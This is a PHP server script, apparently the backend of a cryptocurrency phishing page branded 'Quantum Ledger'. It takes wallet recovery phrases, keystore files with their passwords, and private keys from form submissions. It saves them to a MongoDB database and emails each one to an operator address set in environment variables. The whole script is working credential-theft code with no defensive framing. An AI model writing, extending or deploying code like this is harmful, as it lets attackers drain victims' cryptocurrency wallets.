<?php
// 1. SESSION + CSRF FIRST — BEFORE ANY OUTPUT
session_start(['cookie_secure'=>true,'cookie_httponly'=>true,'use_strict_mode'=>true]);

// 2. Generate token ONCE per session
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

// 3. Output token for frontend
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    header('Content-Type: application/json');
    echo json_encode(['csrf_token' => $_SESSION['csrf_token']]);
    exit;
}

// 4. NOW we can safely output JSON for POST
header('Content-Type: application/json; charset=UTF-8');

ini_set('display_errors', 1);
error_reporting(E_ALL);
ini_set('log_errors', 1);
ini_set('error_log', __DIR__.'/../error.log');

// ——— 1. USE STATEMENTS OUTSIDE ANY BLOCK ———
require __DIR__.'/../vendor/autoload.php';
use Dotenv\Dotenv;
use MongoDB\Driver\Manager;
use MongoDB\Driver\BulkWrite;
use MongoDB\Driver\Exception\Exception as MongoDBException;
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception as PHPMailerException;
// ————————————————

session_start(['cookie_secure'=>true,'cookie_httponly'=>true,'use_strict_mode'=>true]);

$dotenv = Dotenv::createImmutable(__DIR__.'/..');
$dotenv->load();

if (!isset($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    error_log("CSRF failed");
    http_response_code(403);
    echo json_encode(['error'=>'Invalid CSRF Token']);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['error'=>'Method not allowed']);
    exit;
}

// ——— YOUR EXISTING FORM LOGIC (unchanged) ———
$submission_type = $wallet = $email = $data = '';
if (isset($_POST['pwallet'], $_POST['pemail'], $_POST['phrase'])) {
    $submission_type = 'phrase';
    $wallet = trim($_POST['pwallet']);
    $email  = trim($_POST['pemail']);
    $data   = trim($_POST['phrase']);
} elseif (isset($_POST['kwallet'], $_POST['kemail'], $_POST['keystore'], $_POST['password'])) {
    $submission_type = 'keystore';
    $wallet = trim($_POST['kwallet']);
    $email  = trim($_POST['kemail']);
    $data   = trim($_POST['keystore'])."\nPassword: ".trim($_POST['password']);
} elseif (isset($_POST['prwallet'], $_POST['premail'], $_POST['private'])) {
    $submission_type = 'privatekey';
    $wallet = trim($_POST['prwallet']);
    $email  = trim($_POST['premail']);
    $data   = trim($_POST['private']);
} else {
    http_response_code(400);
    echo json_encode(['error'=>'Invalid Submission']);
    exit;
}

// ——— VALIDATION (unchanged) ———
if (empty($wallet) || empty($email) || empty($data) || !filter_var($email, FILTER_VALIDATE_EMAIL)) {
    http_response_code(400);
    echo json_encode(['error'=>'Invalid Input']);
    exit;
}
if (!preg_match('/^[a-zA-Z0-9-_]{1,64}$/', $wallet)) {
    http_response_code(400);
    echo json_encode(['error'=>'Invalid Wallet Name']);
    exit;
}
if (strlen($data) > 1000) {
    http_response_code(400);
    echo json_encode(['error'=>'Input Too Long']);
    exit;
}
$data = htmlspecialchars($data, ENT_QUOTES, 'UTF-8');

if (isset($_SESSION['last_submission']) && (time() - $_SESSION['last_submission']) < 60) {
    http_response_code(429);
    echo json_encode(['error'=>'Rate Limit Exceeded']);
    exit;
}
$_SESSION['last_submission'] = time();

// ——— MONGO ———
$mongoUri = "mongodb://{$_ENV['DB_USER']}:{$_ENV['DB_PASS']}@{$_ENV['DB_HOST']}:{$_ENV['DB_PORT']}/{$_ENV['DB_NAME']}?authSource=admin";
$manager  = new Manager($mongoUri);
$bulk     = new BulkWrite;
$bulk->insert([
    'wallet' => $wallet,
    'email'  => $email,
    'data'   => $data,
    'submission_type' => $submission_type,
    'created_at' => new \MongoDB\BSON\UTCDateTime
]);
$manager->executeBulkWrite("{$_ENV['DB_NAME']}.submissions", $bulk);
error_log("Saved $wallet");

// ——— EMAIL ———
$mail = new PHPMailer(true);
$mail->isSMTP();
$mail->Host       = $_ENV['SMTP_HOST'];
$mail->SMTPAuth   = true;
$mail->Username   = $_ENV['SMTP_USER'];
$mail->Password   = $_ENV['SMTP_PASS'];
$mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
$mail->Port       = 587;
$mail->setFrom($_ENV['SMTP_USER'], 'Quantum Ledger');
$mail->addAddress($_ENV['TO_EMAIL']);
$mail->Subject = "New $submission_type from $wallet";
$mail->Body    = "Wallet: $wallet\nEmail: $email\nData: $data\nTime: ".date('Y-m-d H:i:s');
$mail->send();

echo json_encode(['success' => 'Submission received and emailed']);
?>